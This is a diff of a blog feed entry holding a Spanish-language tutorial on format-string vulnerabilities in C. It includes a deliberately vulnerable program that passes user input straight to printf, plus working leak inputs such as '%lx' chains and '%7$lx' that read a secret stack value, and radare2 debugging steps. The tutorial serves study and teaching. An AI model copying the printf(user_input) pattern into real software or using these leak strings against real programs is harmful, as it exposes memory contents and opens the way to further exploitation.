-&lt;p&gt;Para esta primera parte el programa simplemente esta usando la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; para imprimir la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;input&lt;/code&gt; que contiene la cadena &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Holi:)&lt;/code&gt; y si ejecutamos el programa debe de salir algo como esto:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/format-string/pt1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Pero que pasara si ahora yo en el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; le indico mas format string y el codigo del programa queda asi&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
-&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
-        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Holi:)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s %x %x %x&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Lo compilamos de la misma forma y ejecutamos&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/format-string/pt2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;¿De donde salieron esos caracteres?&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Bueno, en la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; se le estan pasando 4 format string, el primer format string que es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%s&lt;/code&gt; que es para imprimir en string, este corresponde a la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;input&lt;/code&gt;, pero los demas format string que son &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%x&lt;/code&gt; para imprimir un valor en su representacion en hexadecimal no corresponden a nada, entonces como no tienen nada que imprimir empiezan a buscar valores de la memoria del programa y eso es lo que imprime, entonces lo que hacen los 3 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%x&lt;/code&gt; es buscar valores de la memoria e imprimirlos&lt;/p&gt;
-
-&lt;h2 id=&quot;resolviendo-un-pequeño-ejercicio&quot;&gt;Resolviendo un pequeño ejercicio&lt;/h2&gt;
-
-&lt;p&gt;El codigo es el siguiente y se compila de la misma forma que los anteriores&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;unistd.h&amp;gt;
-&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret_num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8badf00d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hello &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;! You'll never get my secret!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;En el programa se esta declarando una variable llamada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret_num&lt;/code&gt; con el valor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x8badf00d&lt;/code&gt; la cual nunca se muesta en la ejecucion del programa, tambien se esta declarando un buffer llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt; en el cual se va almacenar nuestro input y posteriormente lo imprime con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Objetivo:&lt;/strong&gt; Lo que debemos de hacer para resolver este ejercicio es lekear la suficiente memoria para poder vizualizar el valor de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret_num&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Para la primera ejecucion del programa le pasaremos varios format string y queda asi:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/format-string/format1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos como nos muesta varios valores de la memoria en su representacion en hexadecimal, sin embargo aun no vemos nuestro valor secreto pero ahi esta&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;¿Como asi?&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Lo que pasa es que ahora debemos de empezar a jugar con los format string, si revisamos la tabla que puse al principio, hay un format string el cual es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%l&lt;/code&gt;, este format string es para imprimir un tipo de dato &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;long&lt;/code&gt;, entonces si ahora volvemos a ejecutar el binario pero le pasamos esto como input&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%lx %lx %lx %lx %lx %lx %lx %lx %lx
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Nos mostrara algo como esto&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/format-string/format2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos como la posicion numero 7 que se imprimio tiene esto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8badf00d00000000&lt;/code&gt;, el cual es nuestro numero secreto, tambien podemos mostrar directamente lo que se encuentre ahi y lo hacemos asi:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%7$lx
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Lo que esta haciendo es imprimir lo que encuentre en la posicion numero 7 y nos muestra esto que es el valor secreto que buscamos&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/format-string/format3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;visualizandolo-en-radare2&quot;&gt;Visualizandolo en radare2&lt;/h2&gt;
-
-&lt;p&gt;Ahora pasaremos a verlo por detras con radare2, dejo al URL de su pagina para que puedan descargarlo&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://rada.re/n/radare2.html&quot;&gt;https://rada.re/n/radare2.html&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Ingresamos este comando para ejecutar el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radare2 ./vuln&lt;/code&gt;, ingresamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ood&lt;/code&gt; para cambiarnos a modo de lectura y escritura, ingresamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa&lt;/code&gt; para que redare analice el binario, ingresamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s main&lt;/code&gt; para movernos a la funcion main y por ultimo usamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pdf&lt;/code&gt;para desensamblarla y nos muestra algo como esto&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/format-string/radare1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Lo que hare es poner un break point en la direccion donde se hace el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; de nuestro input que es la linea que esta seleccionada, esto es para que cuando se ejecute el binario se detenga en esa parte, y el comando queda asi &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;db 0x5555555551fd&lt;/code&gt;, ahora pondre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dc&lt;/code&gt; para continuar la ejecucion del binario, vemos como se queda esperando un input, en este caso yo lo puse esto:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%lx %lx %lx %lx %lx %lx %lx %lx&lt;/code&gt; y vemos como nos arroja un mensaje que dice &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hit breakpoint at: 0x5555555551fd&lt;/code&gt;, eso es por que llego a ese break point, ahora pondre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dr&lt;/code&gt; para mostrar los registros y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dc&lt;/code&gt;para continuar con la ejecucion del programa y vemos algo como esto&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/format-string/radare2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Esto con el fin de que vean lo que menciono de las calling conventions, vemos como los primeros 6 argumentos se pasan por los registros, y lo que estamos haciendo con los primeros &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%lx %lx %lx %lx %lx %lx %lx %lx&lt;/code&gt; de nuestro input es mostrar los valores de esos registros empezando por el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSI&lt;/code&gt;, de hecho si vemos que lo que nos imprimio fue&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Hello 20 0 400 400 7ffff7fcbae0 80000000c 8badf00d00000000 20786c2520786c25
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Donde los primeros 5 valores despues del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hello&lt;/code&gt;son los valores de los registros RSI, RDX, RCX, R8, R9 y los podemos comparar con los que nos salieron mostrando los registros con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dr&lt;/code&gt;, simplemente en nuestro input los estamos representando en hexadecimal&lt;/p&gt;
-
-&lt;p&gt;Tambien para completar podemos mostrar el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt; con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pxr @ rsp&lt;/code&gt; y esto tambien nos debe de mostar nuestro input y el valor secreto que buscamos&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/format-string/radare3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/format-string/waifu.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="format-string" /><summary type="html">Aprenderas a como realizar un ataque format string</summary></entry></feed>
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="got-overwrite" /><category term="format-string" /><summary type="html">En este articulo resolveremos un ejercicio de explotacion binaria de la pagina ImaginaryCTF donde tenemos de sobreescribir GOT</summary></entry></feed>
